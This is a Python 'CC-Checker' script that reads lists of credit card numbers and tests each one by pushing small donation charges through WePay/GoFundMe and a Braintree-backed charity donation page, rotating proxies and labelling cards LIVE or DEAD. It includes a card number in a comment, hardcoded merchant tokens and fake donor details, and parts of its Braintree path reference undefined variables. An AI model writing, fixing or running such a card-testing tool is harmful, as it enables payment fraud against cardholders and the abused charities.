from colorama import Fore, init
from bs4 import BeautifulSoup
from itertools import cycle
import time
import requests
import json
import threading
import hashlib
import random

#5102669011885421 03/28 128


init()
lock = threading.Lock()


def check_the_creditCard(credit_card, ccCount, proxy="", api='1', proxy_mode=False): # Default to WePAY
    ccNum, ccMonth, ccYear, CcCvv = credit_card.split('|')
    ccNum = ccNum.replace(' ', '')
    ccMonth = ccMonth.replace(' ', '')
    ccYear = ccYear.replace(' ', '')
    CcCvv = CcCvv.replace(' ', '')

    if ccNum == "":
        return "Credit Card Error"
    if ccMonth == "":
        return "Credit Card Error"
    if ccYear == "":
        return "Credit Card Error"
    if CcCvv == "":
        return "Credit Card Error"

    # data = requests.get("https://fauxid.com/fake-name-generator/philippines?age=25-34&gender=male")
    # dd = BeautifulSoup(data.text, 'html.parser')
    # name = dd.find('span', {'class': 'id_name'}).get_text()
    # name_ = name.split(' ')
    # nameLength = len(name_)

    # if nameLength == 4:
    #     firstName, lastName = name_[1], name_[3]
    # elif nameLength == 2:
    #     firstName, lastName = name_[0], name_[1]
    # else:
    #     firstName, lastName = name_[0], name_[1]


    # address = dd.find('address', {'class': 'can-copy'}).text.replace('\n', '')
    # address = address.split(',')
    # try:
    #     Street = address[0] + address[1] + address[2]
    #     address2 = address[2].split(' ')
    # except:
    #     Street = address[0]
    #     address2 = address[1].split(' ')

    # def hasNumbers(inputString):
    #     return any(char.isdigit() for char in inputString)

    # if hasNumbers(address2[2]):
    #     Postal = address2[2]
    #     City = address2[1]

    #     try:
    #         Region = address2[3] + address2[4]
    #     except:
    #         Region = address2[3]

    # else:
    #     Postal = address2[3]
    #     City = address2[1] + ' ' + address2[2]

    #     try:
    #         Region = address2[4] + address2[5]
    #     except:
    #         Region = address2[4]


    def data_loader():
        with open('user_data.json', 'r') as user_data:
            datas = json.load(user_data)
        return datas


    def wepayapi_powered():
        wePayApi = "https://www.wepayapi.com/v2/credit_card/create"
        goFundMe = "https://www.gofundme.com/mvc.php?route=customcheckout/customCheckout"

        if ccNum[0] == "4":
            cctype = "visa"
        else:
            cctype = "mastercard"

        wePayApi_Data = {
            "client_id":"90823",
            "cc_number": ccNum,
            "cvv": CcCvv,
            "expiration_month":ccMonth,
            "expiration_year":ccYear[2:],
            "user_name": data_loader()['user_name'],
            "email": data_loader()["email"],
            "address":
                {
                    "address1":data_loader()["street"],
                    "city": data_loader()["city"],
                    "region": data_loader()["region"],
                    "country":data_loader()["country"],
                    "postal_code": data_loader()["postal_code"],
                },
            "reference_id":"48af75dff9ab404f8508eb0f6e013a203c83dac1",
            "device_token":"29449342-ae90-429b-8449-0688e5a24148"
            }

        lock.acquire()

        try:
            try:
                if proxy_mode:
                    wePay_response = requests.post(wePayApi,json=wePayApi_Data, proxies={"https": proxy}, timeout=4).text
                else:
                    wePay_response = requests.post(wePayApi, json=wePayApi_Data, timeout=4).text
            except KeyboardInterrupt:
                exit(1)
        except:
            wePay_response = '{"errors": "Connection Error."}'

        wePay_response = json.loads(wePay_response)
    
        try:
            if wePay_response['state'] == "new":
                cc_id = wePay_response['credit_card_id']
            else:
                cc_id = "ERROR"
        except KeyError:
            if wePay_response['errors'] == "Proxy Error":
                print(Fore.LIGHTRED_EX + "DEAD" + Fore.RESET + " => " + Fore.LIGHTRED_EX + credit_card + Fore.RESET + "\t[Reason: " + Fore.RED + "Connection Error" + Fore.RESET + "] - [Proxy" + proxy + "]")

            return "Credit Card Error"

        gofundme_data = "donationAmount=5&donationTipAmount=1&donationAnonymous=&donorFirstName=Brando&donorLastName=DelaTorre&donorEmail=brandtits%40gmail.com&donorAddressStreet=&donorAddressStreet2=&donorAddressCity=&donorAddressState=&donorAddressRegion=&donorAddressCountryCode=PH&donorAddressZip=1633&donorAddressPostcode=&emailList=&donationTipOtherAmount=&entered_zip=1633&donorAddressProvince=&teamMemberId=0&gfm_idcode=58355202da94789c3e03a2c534163c6c&fingerprints=%7B%22fingerprints%22%3A%5B%2258355202da94789c3e03a2c534163c6c%22%5D%2C%22userAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+6.1%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F74.0.3729.169+Safari%2F537.36%22%7D&_token=1d8559b30676003109f201370930f778&billingCcExpiration=&reference_id=48af75dff9ab404f8508eb0f6e013a203c83dac1&fundId=34961668&ccInfo%5Bcredit_card_id%5D=" + str(cc_id) + "&ccInfo%5Bstate%5D=new&persistShortTermToken=false&savedToken=false&Donations=true&FBLogin%5Buid%5D=&FBLogin%5Btoken%5D=&content=&gfmFlow=d_ab_c1h&Comments%5Btext%5D=&donationtier_id=&credit_card_number=3016&credit_card_type=" + cctype + "&sid=IlX2laVLP4KBzgq88Bejb9jJDXK135OO9zSThVsQ%2FP8%3D"
        gofundme_response = requests.post(goFundMe, data=gofundme_data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
        result = json.loads(gofundme_response.text)
        
        if result["success"]:
            print(Fore.LIGHTGREEN_EX + "LIVE" + Fore.RESET + " => " + Fore.LIGHTGREEN_EX + credit_card + Fore.RESET + "\t[Charge: " + Fore.GREEN + "$5" + Fore.RESET + "] " + "[CC ENTRY: " + str(ccCount) + "]")
        else:
            print(Fore.LIGHTRED_EX + "DEAD" + Fore.RESET + " => " + Fore.LIGHTRED_EX + credit_card + Fore.RESET + "\t[Reason: " + Fore.RED + result['message'] + Fore.RESET + "]  " + "[CC ENTRY: " + str(ccCount) + "]")
            
        lock.release()

    def braintree_powered():
        ccy = ccYear[2:]
        braintree_API = f"https://api.braintreegateway.com/merchants/htrc4cypjmp4w2j7/client_api/v1/payment_methods/credit_cards?sharedCustomerIdentifierType=undefined&braintreeLibraryVersion=braintree%2Fweb%2F2.30.0&authorizationFingerprint=f3566ef90a5417e14af39fa3f9fb87ba88ae53e05ec273db66c24f8b8b0b083e%7Ccreated_at%3D2019-05-27T13%3A02%3A01.225383348%2B0000%26merchant_id%3Dhtrc4cypjmp4w2j7%26public_key%3Dtjp2xq6vxkc8pvsx&_meta%5Bintegration%5D=dropin&_meta%5Bsource%5D=form&_meta%5BsessionId%5D=08347406-365e-4768-9637-c530090dab5c&share=false&creditCard%5BbillingAddress%5D%5BpostalCode%5D={Postal}&creditCard%5Bnumber%5D={ccNum}&creditCard%5BexpirationMonth%5D={ccMonth}&creditCard%5BexpirationYear%5D={ccy}&creditCard%5Bcvv%5D=458&_method=POST&callback=callback_jsonb70110a1281544e49a156beb0d8b39f8"
        austincommunity_API = "https://austincommunitysteelband.org/wp-admin/admin-ajax.php?action=process_braintree_donation"
        nonce = requests.get(braintree_API).text
        nonce = nonce.replace('/**/callback_jsonb70110a1281544e49a156beb0d8b39f8(', '')
        nonce = nonce.replace(')', '')
        nonce = json.loads(nonce)
        nonce_ = ""

        for newData in nonce['creditCards']:
            nonce_ = newData['nonce']
        first_hash = hashlib.md5(credit_card.encode('utf-8')).hexdigest()
        second_hash = hashlib.md5(first_hash.encode('utf-8'))

        dataContent = f"_wpnonce=657383950d&_wp_http_referer=%2Fdonate-online%2F&billing_first_name=L{firstName}&billing_last_name={lastName}&billing_address_1={Street}&billing_city={City}&billing_state={Region}&billing_postalcode={Postal}&email_address=lancebuan%40gmail.com&donation_message=Just+want+to+help+-DonatePH&donation_amount=1&payment_gateway=bfwc_card_donation_gateway&bfwc_card_donation_nonce={nonce_}&bfwc_device_data=%7B%22device_session_id%22%3A%22{first_hash}%22%2C%22fraud_merchant_id%22%3A%22600000%22%2C%22correlation_id%22%3A%22{second_hash}%22%7D"

        req = requests.post(austincommunity_API, data=dataContent, headers={'Content-Type': 'application/x-www-form-urlencoded'})
        results = json.loads(req.text)
        if results['result'] == "failure":
            print(Fore.LIGHTRED_EX + "DEAD" + Fore.RESET + " => " + Fore.LIGHTRED_EX + credit_card + Fore.RESET + "\t[Reason: " + Fore.RED + results['messages'][0] + Fore.RESET + "]")
            print('INFO => ' + firstName + ' ' + lastName + ":" + Street + ":" + City + ":" + Region + ":" + Postal)
        else:
            print(Fore.LIGHTGREEN_EX + "LIVE" + Fore.RESET + " => " + Fore.LIGHTGREEN_EX + credit_card + Fore.RESET + "\t[Charge: " + Fore.GREEN + "$5"+ Fore.RESET +"]")

    if api == "1":
        wepayapi_powered()
    else:
        braintree_powered()


def main():
    global ccCount
    banner = f"""   
{Fore.RED}  _|_|_|  _|    _|{Fore.YELLOW}            {Fore.RED}  _|_|_|{Fore.GREEN}  _|                            {Fore.RED}_|    _|{Fore.GREEN}                      
{Fore.RED}_|        _|  _|  {Fore.YELLOW}            {Fore.RED}_|      {Fore.GREEN}  _|_|_|      _|_|      _|_|_|  {Fore.RED}_|  _|  {Fore.GREEN}    _|_|    _|  _|_|  
{Fore.RED}_|        _|_|    {Fore.YELLOW}_|_|_|_|_|  {Fore.RED}_|      {Fore.GREEN}  _|    _|  _|_|_|_|  _|        {Fore.RED}_|_|    {Fore.GREEN}  _|_|_|_|  _|_|      
{Fore.RED}_|        _|  _|  {Fore.YELLOW}            {Fore.RED}_|      {Fore.GREEN}  _|    _|  _|        _|        {Fore.RED}_|  _|  {Fore.GREEN}  _|        _|        
{Fore.RED}  _|_|_|  _|    _|{Fore.YELLOW}            {Fore.RED}  _|_|_|{Fore.GREEN}  _|    _|    _|_|_|    _|_|_|  {Fore.RED}_|    _|{Fore.GREEN}    _|_|_|  _|
                            {Fore.LIGHTYELLOW_EX}[Created by Codekiller X Saitama]
"""
    print(banner)
    print()
    print("Choose your Gateway: \n\t" + Fore.LIGHTRED_EX + "\n[1] WePayAPI\n[2] BraintreeAPI\n" + Fore.RESET)
    while True:
        gateway = str(input(">>> "))
    
        if gateway == "1":
            def gateway1():
                ccCount = 0
                proxyMode = str(input("Enable Proxy?[y/n] "))
                print(Fore.LIGHTYELLOW_EX + "[~] Checking Start")
                threads = []
                if proxyMode.lower() == "y":
                    proxy_lists = open("https_live.txt", "r")
                    _proxies = proxy_lists.read()
                    proxies = _proxies.split('\n')
                    proxy_pool = cycle(proxies)
    
                with open('cc.txt', 'r') as f:
                    credit_cards = f.read()
    
                    for cc in credit_cards.split('\n'):
                        ccCount += 1
                        if proxyMode.lower() == "y":
                            proxy = next(proxy_pool)
                            result = threading.Thread(target=check_the_creditCard, args=(cc, ccCount, proxy, "1", True,))
                        else:
                            result = threading.Thread(target=check_the_creditCard, args=(cc, ccCount,))
                        threads.append(result)

                    for x in threads:
                        x.start()
                        x.join()

                    print(Fore.GREEN + "[+] Done Checking " + str(len(credit_cards.split('\n'))))
            gateway1()
    
        elif gateway == "2":
            def gateway2():
                print(Fore.LIGHTYELLOW_EX + "[~] Checking Start")
                threads = []
                with open('cc.txt', 'r') as f:
                    credit_cards = f.read()
                    for cc in credit_cards.split('\n'):
                        th = threading.Thread(target=check_the_creditCard, args=(cc, "2",))
                        threads.append(th)
                        
                    for x in threads:
                        x.start()
                    
                    for x in threads:
                        x.join()    
                        
                    print(Fore.GREEN + "[+] Done Checking " + str(len(credit_cards.split('\n'))))
            gateway2()
        else:
            pass

if __name__ == "__main__":
    main()